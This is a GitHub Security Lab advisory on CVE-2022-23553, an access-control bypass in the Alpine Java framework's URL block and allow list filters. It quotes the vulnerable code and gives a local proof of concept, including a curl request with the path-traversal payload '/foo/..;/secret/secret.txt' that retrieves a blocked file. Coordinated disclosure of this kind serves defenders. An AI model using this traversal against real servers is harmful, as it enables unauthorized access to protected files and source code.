
[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

December 22, 2022
# GHSL-2021-1009: URL access filters bypass in Alpine - CVE-2022-23553

[![Author avatar](https://avatars.githubusercontent.com/u/125701)
Alvaro Munoz](https://github.com/pwntester)

## Coordinated Disclosure Timeline

* 2021-09-24: Report sent to `steve.springett AT owasp.org`
* 2022-02-13: Issue fixed in [1.10.4](https://github.com/stevespringett/Alpine/releases/tag/alpine-parent-1.10.4)

## Summary

URL access filters (block and allow list) are subject to be bypassed

## Product

Alpine

## Tested Version

[1.10.2](https://github.com/stevespringett/Alpine/releases/tag/alpine-parent-1.10.2)

## Details

### Issue: URL block/allow lists bypass (`GHSL-2021-1009`)

Alpine offers two Servlet filters to control the access to different resources based on the visited URL: `BlacklistUrlFilter` and `WhitelistUrlFilter`. Both of them compare the request URI to the list of allowed or blocked URLs using the String’s `startsWith` method.

[BlacklistUrlFilter](https://github.com/stevespringett/Alpine/blob/master/alpine/src/main/java/alpine/filters/BlacklistUrlFilter.java#L107-L121)

```
        final String requestUri = req.getRequestURI();
        if (requestUri != null) {
            for (final String url: denyUrls) {
                if (requestUri.startsWith(url.trim())) {
                    res.setStatus(HttpServletResponse.SC_FORBIDDEN);
                    return;
                }
            }
            for (final String url: ignoreUrls) {
                if (requestUri.startsWith(url.trim())) {
                    res.setStatus(HttpServletResponse.SC_NOT_FOUND);
                    return;
                }
            }
        }

```

[WhitelistUrlFilter](https://github.com/stevespringett/Alpine/blob/master/alpine/src/main/java/alpine/filters/WhitelistUrlFilter.java#L115-L127)

```
        final String requestUri = req.getRequestURI();
        if (requestUri != null) {
            boolean allowed = false;
            final String requestUrlExcludingContext = requestUri.substring(req.getContextPath().length());
            for (final String url: allowUrls) {
                if (requestUrlExcludingContext.equals("/")) {
                    if (url.trim().equals("/") || (url.trim().equals("/index.jsp")) || (url.trim().equals("/index.html"))) {
                        allowed = true;
                    }
                } else if (requestUrlExcludingContext.startsWith(url.trim())) {
                    allowed = true;
                }
            }

```

This approach is insecure since the request URI contains the raw and non-canonicalized version of the URI such as `/allowed/..;/blocked`.
For that particular URI, if the allowlist filter is configured to only allow access to URIs starting with `/allowed`, it will permit the access to `/allowed/..;/blocked`, but later, this URI will get resolved to just `/blocked`

#### Impact

This issue may lead access control bypasses and may enable to leak source code (when protecting application code on executable WAR files)

#### PoC

1. Clone the [Alpine example application](https://github.com/stevespringett/Alpine/tree/master/example)
2. Add a `secret` folder to `/example/src/main/webapp/` with a secret file (eg: `/example/src/main/webapp/secret/secret.txt`)
3. Enable a block list to deny access to `/secret/*`:
   ```
    <filter>
      <filter-name>BlacklistUrlFilter</filter-name>
      <filter-class>alpine.filters.BlacklistUrlFilter</filter-class>
      <init-param>
        <param-name>denyUrls</param-name>
        <param-value>/secret</param-value>
      </init-param>
    </filter>

    <filter-mapping>
      <filter-name>BlacklistUrlFilter</filter-name>
      <url-pattern>/*</url-pattern>
    </filter-mapping>

   ```
4. Start the example application: `mvn clean package -Pembedded-jetty ; java -jar target/example-embedded.war`
5. Access the secret file. You should receive a 403 forbidden response:
   ```
   ❯❯❯ curl -v http://localhost:8080/secret/secret.txt
   *   Trying ::1...
   * TCP_NODELAY set
   * Connected to localhost (::1) port 8080 (#0)
   > GET /secret/secret.txt HTTP/1.1
   > Host: localhost:8080
   > User-Agent: curl/7.64.1
   > Accept: */*
   >
   < HTTP/1.1 403 Forbidden
   < Date: Thu, 23 Sep 2021 16:24:21 GMT
   < Content-Length: 0
   <
   * Connection #0 to host localhost left intact
   * Closing connection 0

   ```
6. Access the secret file as ``:
   ```
   ❯❯❯ curl "http://localhost:8080/foo/..;/secret/secret.txt"
   SUPER_SECRET_FILE

   ```

   ## CVE

   * CVE-2022-23553

## Credit

This issue was discovered and reported by GHSL team member [@pwntester (Alvaro Muñoz)](https://github.com/pwntester).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2021-1009` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information

